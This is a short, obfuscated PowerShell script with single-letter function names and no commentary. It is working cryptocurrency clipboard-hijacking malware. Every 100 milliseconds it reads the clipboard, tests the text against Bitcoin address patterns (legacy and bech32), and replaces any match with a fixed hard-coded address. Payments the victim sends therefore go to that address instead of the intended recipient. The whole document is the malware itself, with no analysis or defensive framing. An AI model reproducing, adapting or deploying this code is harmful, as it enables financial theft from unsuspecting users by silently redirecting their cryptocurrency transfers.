function A() {
return [System.Windows.Forms.Clipboard]::GetText()
}
function Y() {
Param(
[Parameter(Mandatory=$True, Position=0)]
[string] $t
)
return [System.Windows.Forms.Clipboard]::SetText($t)
}
function m() {
Param(
[Parameter(Mandatory=$True, Position=0)]
[string] $t
)
[Regex]$n = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'
$j = $t -match [Regex]$n
return $j
}
function p() {
Param(
[Parameter(Mandatory=$True, Position=0)]
[string] $t
)
[Regex]$n = '^(bc1)(?:[a-z0-9]{39}|[a-z0-9]{59})$'
$j = $t -match [Regex]$n
return $j
}
function g() {
Add-Type -AssemblyName System.Windows.Forms
$k = '17Rg2JfAamMfGAaihhhqBxZX3Lz9YVGy17'
while($True) {
$b = $False
$I = A
$V = $I.Length
if($V -in 26..35 -and $I -ne $k) {
$b = m $I
}
elseif($V -eq 42 -or $V -eq 62 -and $I -ne $k) {
$b = p $I
}
if($b -eq $True) {
Y $k
}
Start-Sleep -m 100
}
}
g